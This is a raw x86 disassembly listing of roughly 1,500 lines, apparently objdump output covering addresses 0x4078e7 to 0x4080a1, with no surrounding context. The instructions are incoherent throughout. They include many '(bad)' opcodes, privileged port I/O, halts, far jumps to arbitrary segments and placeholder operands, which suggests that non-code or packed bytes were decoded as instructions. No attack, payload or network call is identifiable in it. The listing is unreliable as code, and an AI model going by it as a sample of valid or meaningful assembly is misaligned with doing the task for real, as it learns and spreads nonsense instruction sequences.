  4078e7:	fdiv   QWORD PTR [ecx-0x6249eec9]
  4078ed:	jne    0x407918
  4078ef:	int    0x43
  4078f1:	sub    DWORD PTR [ebx+0x54],0x7d
  4078f5:	ja     0x40788f
  4078f7:	push   0xffffffc8
  4078f9:	inc    esi
  4078fa:	arpl   WORD PTR [edx],di
  4078fc:	fisttp WORD PTR [esp+ecx*1]
  4078ff:	mov    eax,0x695dc4e5
  407904:	(bad)  
  407905:	jg     0x407975
  407907:	fsub   QWORD PTR [esi+0x19]
  40790a:	fimul  WORD PTR [ecx-0x7e832eab]
  407910:	mov    edi,DWORD PTR [esi-0x30]
  407913:	dec    ebp
  407914:	or     eax,eax
  407916:	mov    ds:0xa0b70eaa,al
  40791b:	jge    0x4078ef
  40791d:	inc    esi
  40791e:	xchg   edx,eax
  40791f:	lea    edi,[eax-0x6a]
  407922:	pushf  
  407923:	cli    
  407924:	lods   al,BYTE PTR ds:[esi]
  407925:	inc    esp
  407926:	test   eax,0xb3622a72
  40792b:	or     BYTE PTR [edx+0x7c],dh
  40792e:	out    dx,al
  40792f:	lahf   
  407930:	lods   al,BYTE PTR ds:[esi]
  407931:	clc    
  407932:	bound  edi,QWORD PTR [ebx*2-0x1bf0b60]
  407939:	adc    bh,bl
  40793b:	mov    ebp,0xc617dbf4
  407940:	mov    al,ds:0x1357e0fb
  407945:	ss mov ch,0x44
  407948:	xchg   esp,eax
  407949:	imul   edi,DWORD PTR [ebp+0x3e7081c7],0xe
  407950:	scas   al,BYTE PTR es:[edi]
  407951:	pop    edx
  407952:	xor    eax,0xddf5045
  407957:	adc    eax,0xbbc74775
  40795c:	inc    ebp
  40795d:	or     esp,ebp
  40795f:	and    eax,0xdbd75e63
  407964:	sbb    DWORD PTR [esi-0x5c],eax
  407967:	push   edx
  407968:	adc    DWORD PTR [ecx-0x53],0xffffff9d
  40796c:	cld    
  40796d:	adc    DWORD PTR [esi+0xd],esp
  407970:	add    DWORD PTR [esi+0x42],edi
  407973:	fisubr DWORD PTR [esi+0x70]
  407976:	push   0xffffffb2
  407978:	jle    0x407936
  40797a:	aaa    
  40797b:	mov    esi,0xa8ba8d3b
  407980:	lock fst QWORD PTR [eax+0x18058400]
  407987:	popf   
  407988:	bound  edx,QWORD PTR [esi]
  40798a:	icebp  
  40798b:	lds    ebx,FWORD PTR [edi-0x52]
  40798e:	stc    
  40798f:	cmp    al,0x40
  407991:	fst    DWORD PTR [ebx+0x267a1982]
  407997:	adc    al,0xc8
  407999:	inc    esi
  40799a:	xchg   edx,eax
  40799b:	enter  0xae5d,0xf3
  40799f:	xor    eax,0x1f040fad
  4079a4:	nop
  4079a5:	mov    ah,0xff
  4079a7:	test   BYTE PTR [eax+0x963f638],al
  4079ad:	ins    BYTE PTR es:[edi],dx
  4079ae:	add    BYTE PTR [edx-0x20f89465],dh
  4079b4:	push   ecx
  4079b5:	test   al,0xcb
  4079b7:	or     cl,al
  4079b9:	dec    ebx
  4079ba:	push   edi
  4079bb:	repnz lea ecx,ds:0x1d2276e
  4079c2:	and    al,bl
  4079c4:	fidivr DWORD PTR ds:0x48eae14a
  4079ca:	out    0x36,al
  4079cc:	scas   al,BYTE PTR es:[edi]
  4079cd:	cdq    
  4079ce:	call   0xae40:0x9b9b097d
  4079d5:	cmp    esp,DWORD PTR [edx+0x77]
  4079d8:	xchg   edx,eax
  4079d9:	cmp    cl,BYTE PTR [ebx+0x51]
  4079dc:	aaa    
  4079dd:	inc    esp
  4079de:	(bad)  
  4079df:	push   ds
  4079e0:	imul   edx,DWORD PTR [ebx+0x29f817c6],0x56eba7fb
  4079ea:	out    dx,eax
  4079eb:	test   DWORD PTR [edi+edi*8-0x6405fb0e],0x250d43c7
  4079f6:	call   0x2ddd7168
  4079fb:	mov    bl,0x7e
  4079fd:	add    eax,0x338845e8
  407a02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a03:	std    
  407a04:	xlat   BYTE PTR ds:[ebx]
  407a05:	sub    esi,eax
  407a07:	sub    esi,edi
  407a09:	or     ebp,ebp
  407a0b:	(bad)  
  407a0c:	ins    DWORD PTR es:[edi],dx
  407a0d:	inc    eax
  407a0e:	sti    
  407a0f:	scas   al,BYTE PTR es:[edi]
  407a10:	adc    eax,0xd35c1256
  407a15:	jl     0x4079d4
  407a17:	jmp    0x187a:0xd6ed037c
  407a1e:	inc    ebx
  407a1f:	xor    dh,dh
  407a21:	jmp    0x407a58
  407a23:	mov    ecx,0xf0b798f2
  407a28:	fucomip st,st(6)
  407a2a:	xchg   esi,eax
  407a2b:	xchg   DWORD PTR [edx-0x13],esi
  407a2e:	mov    eax,ds:0xf21e920f
  407a33:	sub    BYTE PTR [edi+0x72],bl
  407a36:	loopne 0x4079f7
  407a38:	xor    al,0xc9
  407a3a:	repz mov esp,0x8f92152c
  407a40:	pop    ds
  407a41:	mov    edx,0x789f562f
  407a46:	push   cs
  407a47:	in     al,0x39
  407a49:	mov    edi,0x79ae8719
  407a4e:	sub    BYTE PTR fs:[edi+0x37],0x3b
  407a53:	jmp    0x9d255cfa
  407a58:	int3   
  407a59:	jl     0x407a7c
  407a5b:	outs   dx,BYTE PTR ds:[esi]
  407a5c:	in     eax,dx
  407a5d:	pop    esp
  407a5e:	test   BYTE PTR [ebx+0x5b7ec25f],cl
  407a64:	jnp    0x4079e8
  407a66:	push   0xb123ac0d
  407a6b:	sub    DWORD PTR [edx+0x70c035dc],ebp
  407a71:	rcr    DWORD PTR [esi],1
  407a73:	pop    ebp
  407a74:	mul    DWORD PTR [ecx+ebx*8]
  407a77:	cmp    esp,ecx
  407a79:	test   al,0xc2
  407a7b:	pop    ebp
  407a7c:	(bad)  
  407a7d:	and    dl,al
  407a7f:	(bad)  
  407a80:	call   FWORD PTR [edx-0x60]
  407a83:	shl    DWORD PTR [ebp-0x3d972f33],1
  407a89:	loope  0x407a73
  407a8b:	test   DWORD PTR [ebp-0x6bf2d370],0xc6f887b9
  407a95:	push   esp
  407a96:	pushf  
  407a97:	cld    
  407a98:	fisubr WORD PTR [ebx+0x2f8ed865]
  407a9e:	adc    ecx,0xffffffc2
  407aa1:	cmp    DWORD PTR [eax+0x1c],esi
  407aa4:	dec    esp
  407aa5:	sti    
  407aa6:	scas   al,BYTE PTR es:[edi]
  407aa7:	out    0xcf,al
  407aa9:	jb     0x407a6f
  407aab:	rcr    DWORD PTR [esi-0x6d],cl
  407aae:	daa    
  407aaf:	mov    ds:0x2e4ed6af,al
  407ab4:	nop
  407ab5:	jno    0x407a7f
  407ab7:	xor    eax,0x1a7a6f2c
  407abc:	retf   
  407abd:	icebp  
  407abe:	mov    ecx,DWORD PTR [ecx+edi*1]
  407ac1:	cwde   
  407ac2:	ror    BYTE PTR [ecx-0x4e2bff5b],cl
  407ac8:	or     eax,0x867e56d0
  407acd:	pop    ss
  407ace:	enter  0x1275,0x31
  407ad2:	std    
  407ad3:	jmp    0xabf7480e
  407ad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ad9:	jb     0x407a79
  407adb:	xor    BYTE PTR [esi],dl
  407add:	es (bad) 
  407adf:	(bad)  
  407ae1:	xor    BYTE PTR [esi+0x7e60e4b0],cl
  407ae7:	(bad)  
  407ae8:	xchg   ecx,eax
  407ae9:	sti    
  407aea:	iret   
  407aeb:	push   edx
  407aec:	retf   
  407aed:	mov    esi,0x70f6f4c5
  407af2:	std    
  407af3:	aad    0x63
  407af5:	adc    BYTE PTR [edx-0x4d031985],bh
  407afb:	sbb    DWORD PTR [edx+0x52],esp
  407afe:	jne    0x407aa5
  407b00:	shl    ecx,1
  407b02:	leave  
  407b03:	mov    ecx,0x93f5220
  407b08:	dec    edx
  407b09:	hlt    
  407b0a:	sbb    bh,BYTE PTR [ecx+0x35624f19]
  407b10:	mov    ds:0x60e12ebb,al
  407b15:	mov    edx,0x76e8057d
  407b1a:	inc    ecx
  407b1b:	mov    ah,0xaa
  407b1d:	lods   al,BYTE PTR ds:[esi]
  407b1e:	cdq    
  407b1f:	ror    esp,cl
  407b21:	mov    esp,0xc3282008
  407b26:	ins    BYTE PTR es:[edi],dx
  407b27:	add    bh,BYTE PTR [esi]
  407b29:	jo     0x407b14
  407b2b:	jns    0x407ab6
  407b2d:	sub    edx,DWORD PTR [ebp+edi*8-0x58]
  407b31:	stos   DWORD PTR es:[edi],eax
  407b32:	mov    esp,0xf5878857
  407b37:	adc    ecx,0x98dd8564
  407b3d:	les    edi,FWORD PTR [edx+0x28]
  407b40:	pop    ds
  407b41:	mov    ds:0x5fa30b7e,al
  407b46:	inc    edi
  407b47:	adc    al,0x15
  407b49:	int3   
  407b4a:	outs   dx,DWORD PTR ds:[esi]
  407b4b:	jp     0x407b68
  407b4d:	jmp    0xa7bfa156
  407b52:	imul   ecx,DWORD PTR [esi-0x38],0x88ae595d
  407b59:	dec    esi
  407b5a:	pushf  
  407b5b:	clc    
  407b5c:	leave  
  407b5d:	mov    bl,0x85
  407b5f:	(bad)  
  407b60:	test   eax,0x288b222a
  407b65:	xchg   ebp,eax
  407b66:	cmp    eax,DWORD PTR [edx+ebx*8]
  407b69:	jmp    FWORD PTR [edx-0x2c9629f0]
  407b6f:	dec    edx
  407b70:	bnd jo 0x407b63
  407b73:	fmul   DWORD PTR [ecx+0x1c281bff]
  407b79:	mov    BYTE PTR [edi-0x3d],cl
  407b7c:	lock int 0x9b
  407b7f:	add    dh,0xab
  407b82:	mov    ?,ebx
  407b84:	fisttp QWORD PTR [ecx-0x73736c03]
  407b8a:	data16 jge 0x407c01
  407b8d:	and    DWORD PTR [ecx-0xd],ebp
  407b90:	ja     0x407bab
  407b92:	(bad)  
  407b93:	cmp    al,0x6a
  407b95:	ret    0x6d2f
  407b98:	mov    WORD PTR [eax-0x2facf36c],?
  407b9e:	fcom   QWORD PTR [ecx-0x2a76a65c]
  407ba4:	xchg   esi,eax
  407ba5:	mul    bl
  407ba7:	loope  0x407c22
  407ba9:	ror    bl,cl
  407bab:	dec    ebx
  407bac:	sbb    BYTE PTR ds:0x81fc392f,dh
  407bb2:	out    0x20,al
  407bb4:	out    dx,al
  407bb5:	ss mov dh,0xc9
  407bb8:	retf   
  407bb9:	sbb    eax,0x96923585
  407bbe:	scas   al,BYTE PTR es:[edi]
  407bbf:	lods   al,BYTE PTR ds:[esi]
  407bc0:	fidivr DWORD PTR [esi+eiz*1+0x2c]
  407bc4:	adc    dl,bl
  407bc6:	cmp    DWORD PTR [ecx+esi*8+0x43],edx
  407bca:	push   edi
  407bcb:	mov    dl,BYTE PTR [edi+0x6d856f93]
  407bd1:	add    al,0x8a
  407bd3:	mov    dl,0x82
  407bd5:	mov    WORD PTR [esp+ecx*4],gs
  407bd8:	xor    bh,BYTE PTR [ebp+0x37]
  407bdb:	jmp    0x257c:0xa70afdd0
  407be2:	cmovbe ebp,DWORD PTR [edx]
  407be5:	or     eax,0xf638a02d
  407bea:	or     DWORD PTR [esi],esp
  407bec:	pop    ss
  407bed:	enter  0x1e1a,0xc5
  407bf1:	fsubrp st(4),st
  407bf3:	lock repz clc 
  407bf6:	loop   0x407be8
  407bf8:	cdq    
  407bf9:	cli    
  407bfa:	aam    0x54
  407bfc:	(bad)  
  407bfd:	xor    BYTE PTR [ebx],bh
  407bff:	mov    ch,0x4e
  407c01:	push   0xffffffd4
  407c03:	adc    BYTE PTR [edi+0x45],bl
  407c06:	fs ins DWORD PTR es:[edi],dx
  407c08:	outs   dx,BYTE PTR ds:[esi]
  407c09:	retf   
  407c0a:	mov    ecx,DWORD PTR [eax+esi*2-0x6f]
  407c0e:	pop    edx
  407c0f:	and    bl,BYTE PTR [ebx+0x37587303]
  407c15:	mov    WORD PTR [ebp-0x7a],ds
  407c18:	neg    BYTE PTR [edx-0x24d3738b]
  407c1e:	(bad)  
  407c1f:	ss mov ecx,0x8844d1ac
  407c25:	pop    edi
  407c26:	fild   QWORD PTR [edx+0x323435e9]
  407c2c:	xor    DWORD PTR ds:0x864ec784,eax
  407c32:	(bad)  
  407c33:	popf   
  407c34:	fsubr  QWORD PTR [esi]
  407c36:	xor    eax,ebp
  407c38:	ins    DWORD PTR es:[edi],dx
  407c39:	cdq    
  407c3a:	out    dx,al
  407c3b:	stos   DWORD PTR es:[edi],eax
  407c3c:	dec    esp
  407c3d:	jbe    0x407c20
  407c3f:	je     0x407cac
  407c41:	jb     0x407c28
  407c43:	sub    DWORD PTR ds:0xfa17212,eax
  407c49:	clc    
  407c4a:	fcom   st(5)
  407c4c:	retf   
  407c4d:	sub    DWORD PTR [edi],edx
  407c4f:	sub    al,0x97
  407c51:	mov    dl,0x42
  407c53:	mov    eax,0xcef44371
  407c58:	int    0xe7
  407c5a:	sub    DWORD PTR [edi-0x70c31b0a],edx
  407c60:	add    eax,0x8e069110
  407c65:	add    dh,ah
  407c67:	outs   dx,DWORD PTR ds:[esi]
  407c68:	push   ebp
  407c69:	test   al,0x2c
  407c6b:	pop    eax
  407c6c:	popa   
  407c6d:	adc    DWORD PTR [ecx-0xb1d746e],ecx
  407c73:	imul   edi,DWORD PTR [eax],0xca5b7770
  407c79:	popf   
  407c7a:	pushf  
  407c7b:	inc    eax
  407c7c:	outs   dx,DWORD PTR ds:[esi]
  407c7d:	test   eax,0x88f3672e
  407c82:	xor    DWORD PTR [esi],esi
  407c84:	in     al,dx
  407c85:	inc    eax
  407c86:	in     eax,dx
  407c87:	jmp    0x407c93
  407c89:	fist   DWORD PTR [eax+0x3c18783f]
  407c8f:	popf   
  407c90:	sti    
  407c91:	add    eax,0x8f69912c
  407c96:	outs   dx,BYTE PTR ds:[esi]
  407c97:	mov    cs,WORD PTR [ebx+edi*4+0x4d]
  407c9b:	mov    dh,0xa5
  407c9d:	pop    ebp
  407c9e:	int    0xcd
  407ca0:	inc    ebx
  407ca1:	icebp  
  407ca2:	outs   dx,DWORD PTR ds:[esi]
  407ca3:	and    BYTE PTR [edx],dl
  407ca5:	xor    DWORD PTR [ebp-0xa98707],edx
  407cab:	xor    al,0x88
  407cad:	push   0x3cc7ed3b
  407cb2:	(bad)  
  407cb4:	or     al,0x1
  407cb6:	push   0xffffffb3
  407cb8:	and    dl,ah
  407cba:	or     esp,edi
  407cbc:	ficom  DWORD PTR [esi-0x5bba645c]
  407cc2:	jb     0x407c70
  407cc4:	popf   
  407cc5:	ret    
  407cc6:	das    
  407cc7:	pop    ebp
  407cc8:	push   ecx
  407cc9:	inc    ecx
  407cca:	or     eax,DWORD PTR [eax+0x52]
  407ccd:	fmul   DWORD PTR [ecx-0xd]
  407cd0:	pop    esi
  407cd1:	or     esi,DWORD PTR [edi+edx*2+0x2504f507]
  407cd8:	je     0x407d50
  407cda:	and    ah,bl
  407cdc:	adc    dh,BYTE PTR [eax]
  407cde:	(bad)  
  407cdf:	test   eax,0x6dcfedfe
  407ce4:	fs jmp 0x88e5:0x33bdd54
  407cec:	xchg   ebp,eax
  407ced:	sbb    cl,0xda
  407cf0:	xchg   edi,eax
  407cf1:	sti    
  407cf2:	shl    DWORD PTR [eax+0x75],0x17
  407cf6:	and    edi,DWORD PTR [edi-0x59e234f4]
  407cfc:	js     0x407cd1
  407cfe:	out    0x8a,eax
  407d00:	push   es
  407d01:	outs   dx,BYTE PTR ds:[esi]
  407d02:	xchg   edi,eax
  407d03:	jo     0x407cb1
  407d05:	add    BYTE PTR ds:0x924a5a08,al
  407d0b:	loopne 0x407d45
  407d0d:	and    dl,dh
  407d0f:	mov    dh,0xf5
  407d11:	adc    DWORD PTR [edx+ecx*8-0x5],edi
  407d15:	jmp    0x407ccf
  407d17:	je     0x407d32
  407d19:	popf   
  407d1a:	fcmovb st,st(2)
  407d1c:	(bad)  
  407d1d:	clc    
  407d1e:	mov    dh,0x4
  407d20:	bound  esp,QWORD PTR [ebx]
  407d22:	and    BYTE PTR [edx+0xb0c9778],bh
  407d28:	mov    BYTE PTR [ecx+0x7afcf847],dh
  407d2e:	(bad)
  407d31:	jnp    0x407d72
  407d33:	daa    
  407d34:	in     eax,dx
  407d35:	jmp    0x2f2e:0xb740062e
  407d3c:	cmp    DWORD PTR [esp+esi*4-0x63164380],esp
  407d43:	inc    esi
  407d44:	jp     0x407cd0
  407d46:	(bad)  
  407d47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d48:	loope  0x407d38
  407d4a:	cmp    al,0x7c
  407d4c:	arpl   WORD PTR [edx+0x6f],ax
  407d4f:	inc    ecx
  407d50:	mov    esi,0xb9a9318f
  407d55:	gs inc ebp
  407d57:	nop
  407d58:	into   
  407d59:	arpl   WORD PTR [edi],si
  407d5b:	int    0xf2
  407d5d:	icebp  
  407d5e:	int    0x81
  407d60:	xchg   ebx,eax
  407d61:	adc    eax,0x818d8726
  407d66:	jbe    0x407d57
  407d68:	and    al,0xef
  407d6a:	mov    ds:0x6207db5e,al
  407d6f:	ficom  WORD PTR [ebx]
  407d71:	aam    0xc8
  407d73:	push   edi
  407d74:	inc    esi
  407d75:	out    0xb5,al
  407d77:	dec    DWORD PTR [ebp-0x1f1fa39a]
  407d7d:	sbb    al,0x2f
  407d7f:	sub    DWORD PTR [edi-0x793a0247],esp
  407d85:	lds    edx,FWORD PTR [ebp-0x51]
  407d88:	stos   DWORD PTR es:[edi],eax
  407d89:	xchg   ecx,eax
  407d8a:	pushf  
  407d8b:	mov    bh,0xbe
  407d8d:	pop    ebx
  407d8e:	jmp    FWORD PTR [eax+ecx*2+0x2d16d64a]
  407d95:	push   ecx
  407d96:	aad    0x6e
  407d98:	mov    ecx,0x938f2db
  407d9d:	or     DWORD PTR [ebx-0x741b2ad8],ebx
  407da3:	xor    ebx,DWORD PTR [ecx]
  407da5:	push   ebp
  407da6:	and    DWORD PTR [ebp-0x2e5bd6a8],esi
  407dac:	xchg   esp,eax
  407dad:	mov    ecx,0x5173aba1
  407db2:	and    al,0x2b
  407db4:	aam    0x31
  407db6:	xchg   ecx,eax
  407db7:	jmp    0xddec62
  407dbc:	js     0x407e1c
  407dbe:	jnp    0x407dc6
  407dc0:	pop    ecx
  407dc1:	lock popa 
  407dc3:	mov    WORD PTR [ebp+0x39],cs
  407dc6:	mov    ds:0xb1f05eb6,eax
  407dcb:	bound  edx,QWORD PTR [esi-0x7b2e3f06]
  407dd1:	xor    bl,al
  407dd3:	fnstcw WORD PTR [esi+0x3e1ea122]
  407dd9:	ror    ch,0x6c
  407ddc:	popa   
  407ddd:	sti    
  407dde:	dec    esp
  407ddf:	in     al,dx
  407de0:	iret   
  407de1:	aad    0x95
  407de3:	(bad)  
  407de4:	in     al,dx
  407de5:	push   es
  407de6:	or     bl,BYTE PTR [ebx-0x12399546]
  407dec:	lock fidiv DWORD PTR [eax-0x64]
  407df0:	rol    ecx,0x4f
  407df3:	add    al,0x37
  407df5:	push   0xffffffd4
  407df7:	inc    ebx
  407df8:	ja     0x407e18
  407dfa:	stos   BYTE PTR es:[edi],al
  407dfb:	imul   eax,DWORD PTR gs:[edi],0xffffffe9
  407dff:	push   es
  407e00:	data16 sub al,BYTE PTR [edx-0x41]
  407e04:	les    esi,FWORD PTR [eax]
  407e06:	fsubr  QWORD PTR [eax-0x44]
  407e09:	jecxz  0x407de2
  407e0b:	cwde   
  407e0c:	xchg   edx,eax
  407e0d:	or     BYTE PTR [esi-0xd],ah
  407e10:	push   cs
  407e11:	clc    
  407e12:	lods   al,BYTE PTR ds:[esi]
  407e13:	hlt    
  407e14:	aaa    
  407e15:	inc    eax
  407e16:	das    
  407e17:	add    DWORD PTR [esi],edi
  407e19:	xchg   ebp,eax
  407e1a:	sahf   
  407e1b:	cwde   
  407e1c:	dec    edx
  407e1d:	leave  
  407e1e:	push   ebx
  407e1f:	mov    DWORD PTR [edi+0x60],edi
  407e22:	sbb    DWORD PTR [edx+0x4b994033],esp
  407e28:	jmp    0xcfd735f2
  407e2d:	mov    edx,0x7302a5a5
  407e32:	mov    BYTE PTR [esi],ch
  407e34:	mov    eax,0x29de8c39
  407e39:	and    esp,DWORD PTR [eax]
  407e3b:	sub    edx,eax
  407e3d:	fwait
  407e3e:	and    bl,BYTE PTR [ebx+eax*4]
  407e41:	mov    edi,DWORD PTR [ebp-0x56]
  407e44:	add    DWORD PTR [edx+0xb],eax
  407e47:	xchg   ebp,eax
  407e48:	add    ebx,ebp
  407e4a:	aas    
  407e4b:	jl     0x407e6a
  407e4d:	leave  
  407e4e:	int3   
  407e4f:	push   esp
  407e50:	adc    BYTE PTR [ebp+0x210e522f],ah
  407e56:	scas   al,BYTE PTR es:[edi]
  407e57:	pop    ebx
  407e58:	jmp    0x5bc5a479
  407e5d:	ret    0x8e5a
  407e60:	pop    esp
  407e61:	loope  0x407e4e
  407e63:	mov    ah,0x3e
  407e65:	push   esi
  407e66:	or     eax,0x4ae56959
  407e6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e6c:	sahf   
  407e6d:	mov    ds:0x4114d255,al
  407e72:	cwde   
  407e73:	int    0x4a
  407e75:	xlat   BYTE PTR ds:[ebx]
  407e76:	ret    
  407e77:	rol    esi,0x72
  407e7a:	xchg   edx,eax
  407e7b:	sbb    eax,0xbd76662
  407e80:	outs   dx,BYTE PTR ds:[esi]
  407e81:	and    eax,0xf470ff63
  407e86:	sbb    dh,BYTE PTR [edi-0x38e7f4de]
  407e8c:	jnp    0x407e52
  407e8e:	jne    0x407ef1
  407e90:	scas   eax,DWORD PTR es:[edi]
  407e91:	pop    es
  407e92:	ja     0x407ecf
  407e94:	ins    DWORD PTR es:[edi],dx
  407e95:	push   edx
  407e96:	imul   edi,DWORD PTR [edi+0x1236bd86],0xa4c409a3
  407ea0:	and    ebp,DWORD PTR [ecx]
  407ea2:	fwait
  407ea3:	mov    al,ah
  407ea5:	(bad)  
  407ea6:	repnz adc bh,BYTE PTR [esi]
  407ea9:	into   
  407eaa:	lods   al,BYTE PTR ds:[esi]
  407eab:	push   esp
  407eac:	(bad)  
  407ead:	clc    
  407eae:	arpl   di,di
  407eb0:	push   ss
  407eb1:	cs cli 
  407eb3:	inc    edx
  407eb4:	sbb    eax,0x85710a7f
  407eb9:	sbb    bl,BYTE PTR [ecx]
  407ebb:	ins    BYTE PTR es:[edi],dx
  407ebc:	clc    
  407ebd:	lea    esp,[ebx+0x46]
  407ec0:	mov    bh,0xda
  407ec2:	sbb    BYTE PTR [ebp+ebp*1+0x45de3808],dl
  407ec9:	pop    ebp
  407eca:	add    ebp,ecx
  407ecc:	test   ch,dl
  407ece:	and    ebx,ebp
  407ed0:	dec    eax
  407ed1:	push   esi
  407ed2:	inc    ecx
  407ed3:	mov    esp,0x1d52172
  407ed8:	add    ebx,DWORD PTR [edi-0x74874ee1]
  407ede:	mov    al,ds:0x78a9df46
  407ee3:	jne    0x407e9c
  407ee5:	sahf   
  407ee6:	in     al,dx
  407ee7:	daa    
  407ee8:	pop    ecx
  407ee9:	push   ss
  407eea:	out    0x70,al
  407eec:	shr    BYTE PTR [edi+edi*1-0x26],cl
  407ef0:	jmp    0xdacc5532
  407ef5:	or     eax,0x49d89bd4
  407efa:	xor    ebp,edx
  407efc:	sub    esp,ecx
  407efe:	mov    bh,0x19
  407f00:	into   
  407f01:	or     DWORD PTR [eax],ebp
  407f03:	ficomp DWORD PTR [ecx+0x13]
  407f06:	icebp  
  407f07:	addr16 mov ch,0x56
  407f0a:	cmp    eax,0xe67b9f9e
  407f0f:	mov    ch,0x6b
  407f11:	neg    DWORD PTR [ebx-0x39cba3e4]
  407f17:	sbb    eax,0xd856d9ae
  407f1c:	push   eax
  407f1d:	mov    eax,0x659295ce
  407f22:	sbb    eax,0xd41c69b9
  407f27:	jns    0x407f78
  407f29:	ds jo  0x407f92
  407f2c:	and    BYTE PTR [ebp-0x2],cl
  407f2f:	pop    edi
  407f30:	pop    esp
  407f31:	nop
  407f32:	pop    ds
  407f33:	(bad)  
  407f34:	out    dx,eax
  407f35:	retf   0xa3a6
  407f38:	(bad)  
  407f39:	cmp    al,0x40
  407f3b:	test   eax,0xf5a27088
  407f40:	int3   
  407f41:	in     al,dx
  407f42:	mov    edi,0xd5a38fa7
  407f47:	xchg   esi,eax
  407f48:	sbb    BYTE PTR [ebp-0x3e5b3dfc],0x96
  407f4f:	in     eax,0x58
  407f51:	sahf   
  407f52:	sub    ebp,DWORD PTR [edi+0x472cca13]
  407f58:	es sahf 
  407f5a:	std    
  407f5b:	xor    DWORD PTR [edi],0x115e2546
  407f61:	popf   
  407f62:	lds    ebp,FWORD PTR [edx+edx*2-0x31bb1531]
  407f69:	outs   dx,DWORD PTR ds:[esi]
  407f6a:	mov    esp,0xf6a574f5
  407f6f:	int3   
  407f70:	ins    DWORD PTR es:[edi],dx
  407f71:	jg     0x407fb2
  407f73:	push   DWORD PTR [esi]
  407f75:	retf   0x2d66
  407f78:	or     DWORD PTR [edi+0x7148bf9c],eax
  407f7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f7f:	(bad)  
  407f81:	inc    ebp
  407f82:	cmp    eax,0xe9f4eaab
  407f87:	inc    eax
  407f88:	inc    ecx
  407f89:	push   ebp
  407f8a:	sbb    al,0x9b
  407f8c:	je     0x407f4c
  407f8e:	pusha  
  407f8f:	inc    edi
  407f90:	or     edx,DWORD PTR [ecx]
  407f92:	add    al,0x72
  407f94:	stos   DWORD PTR es:[edi],eax
  407f95:	outs   dx,DWORD PTR ds:[esi]
  407f96:	test   al,0x74
  407f98:	rcr    BYTE PTR [ebp-0x6d],0xa3
  407f9c:	ins    BYTE PTR es:[edi],dx
  407f9d:	mov    edx,0x1ab055fd
  407fa2:	xlat   BYTE PTR ds:[ebx]
  407fa3:	mov    bh,0x7f
  407fa5:	push   eax
  407fa6:	js     0x407f6d
  407fa8:	push   es
  407fa9:	outs   dx,DWORD PTR ds:[esi]
  407faa:	repz or DWORD PTR [ecx+0x4b],esi
  407fae:	inc    DWORD PTR [edx]
  407fb0:	out    dx,eax
  407fb1:	push   ebp
  407fb2:	mov    dh,0xce
  407fb4:	push   0x4f
  407fb6:	dec    ebx
  407fb7:	js     0x40802b
  407fb9:	pop    ebp
  407fba:	mov    ah,0x7a
  407fbc:	xlat   BYTE PTR ds:[ebx]
  407fbd:	xor    edi,DWORD PTR [eax]
  407fbf:	fucomip st,st(1)
  407fc1:	pushf  
  407fc2:	xlat   BYTE PTR ds:[ebx]
  407fc3:	stos   DWORD PTR es:[edi],eax
  407fc4:	xchg   ebp,eax
  407fc5:	test   al,0x15
  407fc7:	lahf   
  407fc8:	adc    ebx,DWORD PTR [ebx-0x6d]
  407fcb:	or     DWORD PTR [ecx+0x5c],edx
  407fce:	mov    esi,DWORD PTR [ebp-0x472c73ea]
  407fd4:	push   esp
  407fd5:	pop    ebx
  407fd6:	adc    dl,bl
  407fd8:	(bad)  
  407fd9:	in     eax,0x21
  407fdb:	inc    ebp
  407fdc:	lods   eax,DWORD PTR ds:[esi]
  407fdd:	lods   al,BYTE PTR ds:[esi]
  407fde:	cld    
  407fdf:	xchg   DWORD PTR [edx+eax*4-0x70],esp
  407fe3:	aas    
  407fe4:	push   ds
  407fe5:	pop    edi
  407fe6:	dec    ebx
  407fe7:	xor    ah,bl
  407fe9:	imul   edx,DWORD PTR [ebp+0x7caa18dd],0x6c
  407ff0:	dec    edx
  407ff1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ff2:	mov    esp,0xa4e93b1d
  407ff7:	fs xchg BYTE PTR es:[esi],dl
  407ffb:	push   ecx
  407ffc:	ins    BYTE PTR es:[edi],dx
  407ffd:	ja     0x407fbb
  407fff:	in     eax,dx
  408000:	mov    edx,0x7aade226
  408005:	rol    BYTE PTR fs:[edx+0x6da5b61f],cl
  40800c:	pop    ds
  40800d:	pop    eax
  40800e:	pop    esp
  40800f:	leave  
  408010:	fimul  DWORD PTR [ebp-0x767e7add]
  408016:	imul   edi,DWORD PTR [ebx],0x8600fcc6
  40801c:	test   BYTE PTR [ecx+0x57],al
  40801f:	sub    al,0x2e
  408021:	mov    esp,0xc2f52
  408026:	mov    dl,0x6a
  408028:	sahf   
  408029:	mov    dl,0xd8
  40802b:	imul   ecx,DWORD PTR [eax+0x50a9326],0x44cfa00c
  408035:	jne    0x407ff1
  408037:	sub    BYTE PTR [esi-0x1e2e8ced],ah
  40803d:	add    dl,BYTE PTR [ebp+0x53]
  408040:	dec    esi
  408041:	inc    esp
  408042:	xor    ebx,DWORD PTR [ebx-0x31]
  408045:	dec    ebx
  408046:	(bad)
  408049:	push   ss
  40804a:	enter  0x70d,0xd2
  40804e:	push   0xffffff86
  408050:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408051:	push   cs
  408052:	mov    edx,0xb20f3b70
  408057:	ror    DWORD PTR [edx-0x619d20b1],0xcc
  40805e:	pop    esp
  40805f:	imul   ebp,DWORD PTR [esi+ebp*4+0x5a982fb9],0x8b30bea5
  40806a:	dec    ebx
  40806b:	in     al,0xdd
  40806d:	ins    BYTE PTR es:[edi],dx
  40806e:	sbb    eax,0xec49ad6b
  408073:	and    dl,BYTE PTR [esi+esi*1-0x5a]
  408077:	jle    0x408078
  408079:	sub    al,0xa3
  40807b:	push   esi
  40807c:	inc    esi
  40807d:	pop    ss
  40807e:	outs   dx,BYTE PTR ds:[esi]
  40807f:	cmp    al,dl
  408081:	or     al,dh
  408083:	adc    DWORD PTR [ecx+edx*1+0x3ab018f5],0x4a7a34d3
  40808e:	stc    
  40808f:	adc    edx,DWORD PTR [edi-0x24]
  408092:	fwait
  408093:	add    ecx,DWORD PTR [ecx-0x56]
  408096:	mov    ebp,0x681ee2bf
  40809b:	fist   WORD PTR [ecx+0x66]
  40809e:	das    
  40809f:	bound  esi,QWORD PTR [edx]
  4080a1:	(bad)  
